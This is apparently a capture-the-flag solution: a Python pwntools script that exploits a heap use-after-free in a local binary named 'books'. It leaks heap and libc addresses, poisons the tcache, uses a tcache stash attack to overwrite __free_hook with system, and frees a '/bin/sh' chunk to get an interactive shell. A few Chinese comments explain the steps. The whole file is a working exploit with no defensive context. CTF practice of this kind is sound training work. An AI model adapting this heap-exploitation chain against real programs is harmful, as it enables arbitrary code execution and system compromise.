#-*- coding:utf-8 -*-
from pwn import *
context(os = 'linux', arch = 'amd64', log_level = 'debug', terminal = ['tmux', 'splitw', '-h'])
p = process('./books')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.sendlineafter('name? ', 'yuan')

def Buy(index, size, content):
    p.sendlineafter('Your choice: ', '1')
    p.sendlineafter('book? ', str(index))
    p.sendlineafter('content? ', str(size))
    p.sendafter('input your content: ', content)
    p.sendlineafter('want a receipt? [y/n] ', 'n')

def Sell(index):
    p.sendlineafter('Your choice: ', '2')
    p.sendlineafter('book? ', str(index))

def Write(index, content):
    p.sendlineafter('Your choice: ', '3')
    p.sendlineafter('book? ', str(index))
    p.sendafter('content: ', content)

def Read(index):
    p.sendlineafter('Your choice: ', '4')
    p.sendlineafter('book? ', str(index)) 

def Magic(data):
    p.sendlineafter('Your choice: ', str(0xdeadbeef))
    p.sendafter('Here is a magic place.\n', data)

Buy(1, 0x120, 'AAAAA\n')
Buy(2, 0x120, '/bin/sh\x00\n')
Sell(1)

Write(1, '\x00'*0x120)
Sell(1)


Write(1, '\x00'*0x120)
Sell(1)
############################  leak heap_base ######################
Read(1)
#raw_input('#')
p.recvuntil("book's content: ")
heap_base = u64(p.recv(6) + '\x00\x00') - 0x2d0
info("heap_base ==> " + hex(heap_base))

Write(1, '\x00'*0x120)
Sell(1)
Write(1, '\x00'*0x120)
Sell(1)
Write(1, '\x00'*0x120)
Sell(1)
Write(1, '\x00'*0x120)
Sell(1)
Write(1, '\x00'*0x120)
Sell(1)

################# leak libc_base #################
Read(1)
p.recvuntil("book's content: ")

libc_base = u64(p.recv(6).ljust(8, '\x00')) - 0x1ebbe0
info("libc_base ==> " + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
info("malloc_hook ==> " + hex(malloc_hook))
system_addr = libc_base + libc.sym['__libc_system']
info("system_addr ==> " + hex(system_addr))
free_hook = libc_base + libc.sym['__free_hook']
info("free_hook ==> " + hex(free_hook))

#布置好free_hook
Buy(1, 0x233, 'AAAA\n')
Sell(1)
Write(1, p64(free_hook) + '\x00'*8 + '\n')
Buy(3, 0x140, 'AAAA\n')


#在tcache中放6个chunk，为下面tcache stash做准备
Buy(1, 0x100, 'AAAA\n')
Buy(3, 0x140, 'AAAA\n')
for i in range(5):
    Sell(1)
    Write(1, '\x00'*0x20 + '\n')
Sell(1)
#接下来的目标是在smallbin中放入两个0x240大小的chunk

for i in range(7):
    Buy(1, 0x310, 'AAAA\n')
    Sell(1)

for i in range(2):
    Buy(1, 0x310, 'AAAA\n')
    Buy(2, 0x200, 'AAAA\n') #防止free时被top chunk合并
    Sell(1)
    Buy(2, 0x200, 'AAAAA\n') #split chunk
    Buy(2, 0x110, '/bin/sh\x00\n')

payload = '\x00'*0x200 + p64(0) + p64(0x111) + p64(heap_base+0x21f0) + p64(heap_base+0x44)
Write(1, payload)
Buy(1, 0x100, 'AAAA\n') #tcache stash
Magic('AAAA\n')
Magic(p64(system_addr) + '\x00\n')

Sell(2)
p.interactive()
